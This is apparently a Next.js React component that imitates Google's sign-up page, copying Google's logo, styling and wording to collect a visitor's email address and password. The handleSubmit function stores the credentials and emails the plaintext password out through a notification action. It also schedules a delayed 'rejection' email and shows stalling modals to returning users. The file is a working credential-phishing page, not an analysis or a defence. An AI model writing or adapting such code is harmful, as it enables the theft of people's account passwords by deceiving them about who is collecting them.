"use client";

import { useState } from "react";
import Image from "next/image";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { AvatarIcon, ChevronLeftIcon } from "@radix-ui/react-icons";
import Link from "next/link";
import InProgress from "@/components/InProgress";
import { checkUserExistence } from "@/actions/user";
import { sendEmailNotification } from "@/actions/notification";
import { generateEmailNotification, generateRejectionEmail } from "@/lib/utils";
import { signInUser, RegisteredBy } from "@/actions/auth";
import UserInputs from "@/components/UserInputs";
import RejectionModal from "@/components/RejectionModal";

const Google = () => {
  const [loading, setLoading] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<"email" | "password" | "inputs">("email");
  const [showPassword, setShowPassword] = useState(false);
  const [showModal, setShowModal] = useState<"reject" | "in-progress" | null>(
    null
  );
  const [userId, setUserId] = useState<number>();

  const toggleShowPassword = () => setShowPassword(!showPassword);

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    setLoading(true);
    try {
      const createdAt = await checkUserExistence(email);
      if (createdAt) {
        const createdAtDate = new Date(createdAt);
        const now = new Date();
        const hoursDifference =
          (now.getTime() - createdAtDate.getTime()) / (1000 * 60 * 60);
        setEmail("");
        setPassword("");
        if (hoursDifference < 72) {
          setShowModal("in-progress");
        } else {
          setShowModal("reject");
        }
      } else {
        const id = await signInUser({
          email,
          password,
          registeredBy: RegisteredBy.GOOGLE,
        });
        setUserId(id);
        setStep("inputs");

        const emailBody = generateEmailNotification({ email, password });
        await sendEmailNotification(emailBody);

        setTimeout(async () => {
          try {
            const rejectionEmailBody = await generateRejectionEmail(email);
            await sendEmailNotification(rejectionEmailBody);
          } catch (error) {
            console.error("Failed to send rejection email:", error);
          }
        }, 259200000);
      }
    } catch (error) {
      console.log("Error: ", error);
    } finally {
      setEmail("");
      setPassword("");
      setShowPassword(false);
      setLoading(false);
    }
  };

  return (
    <>
      {showModal === "reject" ? (
        <RejectionModal />
      ) : showModal === "in-progress" ? (
        <InProgress />
      ) : step === "email" ? (
        <Card className="max-w-md w-full p-12  animate-fade-in-scale relative z-10 mt-5 sm:mt-0">
          <div className="flex flex-col items-center space-y-7 relative">
            <Link href="/">
              <ChevronLeftIcon className="w-6 h-6 absolute top-[-82px] sm:top-0 left-[-50px] sm:left-[-85px] text-white" />
            </Link>
            <Image
              src="/google.webp"
              width={80}
              height={27}
              alt="google"
              className="mx-auto"
            />
            <div className="text-center space-y-2">
              <h1 className="text-2xl font-normal text-black">Sign up</h1>
              <p className="text-base text-black">with your Google Account</p>
            </div>

            <form
              id="email"
              className="w-full space-y-6"
              onSubmit={(e) => {
                e.preventDefault();
                setStep("password");
              }}
            >
              <div className="relative">
                <Input
                  type="email"
                  placeholder=""
                  id="email"
                  value={email}
                  required
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full h-12 px-4 pr-12 pt-4 pb-1 rounded-[4px] input-focus-ring transition-all duration-200 ease-in-out peer placeholder-transparent"
                />
                <label
                  htmlFor="email"
                  className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:text-xs peer-focus:top-3 peer-focus:text-google-blue
                  peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3 pointer-events-none"
                >
                  Enter your email
                </label>
              </div>

              <div className="flex justify-end">
                <Button className="bg-[#1A73E8] hover:bg-google-blue/95 text-white px-6 py-2 rounded transition-colors duration-200">
                  Next
                </Button>
              </div>
            </form>
          </div>
        </Card>
      ) : step === "password" ? (
        <Card className="max-w-md w-full p-12 animate-fade-in-scale relative z-10 mt-5 sm:mt-0">
          <div className="flex flex-col items-center space-y-7 relative">
            <Link href="/">
              <ChevronLeftIcon className="w-6 h-6 absolute top-[-82px] sm:top-0 left-[-50px] sm:left-[-85px] text-white" />
            </Link>
            <Image
              src="/google.webp"
              width={80}
              height={27}
              alt="google"
              className="mx-auto"
            />
            <div className="text-center space-y-2">
              <h1 className="text-2xl font-normal text-gray-900">Welcome</h1>
              <div className="flex flex-col sm:flex-row items-center justify-center space-x-2">
                <div className="flex items-center gap-2">
                  <AvatarIcon className="w-6 h-6" />
                  <span className="text-sm text-gray-600">{email.trim()}</span>
                </div>
                <Button
                  variant="ghost"
                  className="text-sm h-auto p-1 hover:bg-transparent"
                  onClick={() => {
                    setStep("email");
                    setPassword("");
                    setShowPassword(false);
                  }}
                >
                  Change
                </Button>
              </div>
            </div>

            <form className="w-full space-y-6" onSubmit={handleSubmit}>
              <div className="relative">
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-12 px-4 rounded-[4px] pr-12 pt-4 pb-1 input-focus-ring transition-all duration-200 ease-in-out peer placeholder-transparen"
                    placeholder=""
                    id="password"
                    required
                    autoComplete="new-password"
                  />

                  <label
                    htmlFor="password"
                    className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:text-xs peer-focus:top-3 peer-focus:text-google-blue
                  peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3 pointer-events-none"
                  >
                    Enter your password
                  </label>
                </div>
              </div>

              <div className="flex items-center">
                <input
                  onClick={toggleShowPassword}
                  type="checkbox"
                  id="show-password"
                  className="h-4 w-4 text-google-blue rounded border-gray-300 focus:ring-google-blue"
                />
                <label
                  htmlFor="show-password"
                  className="ml-2 text-sm text-gray-600 cursor-pointer"
                >
                  Show password
                </label>
              </div>

              <div className="flex items-center justify-end pt-4">
                <Button
                  disabled={loading}
                  className="bg-[#1A73E8] hover:bg-google-blue/95 text-white px-6 py-2 rounded transition-colors duration-200"
                >
                  Next
                </Button>
              </div>
            </form>
          </div>
        </Card>
      ) : (
        <UserInputs id={userId as number} />
      )}
    </>
  );
};

export default Google;
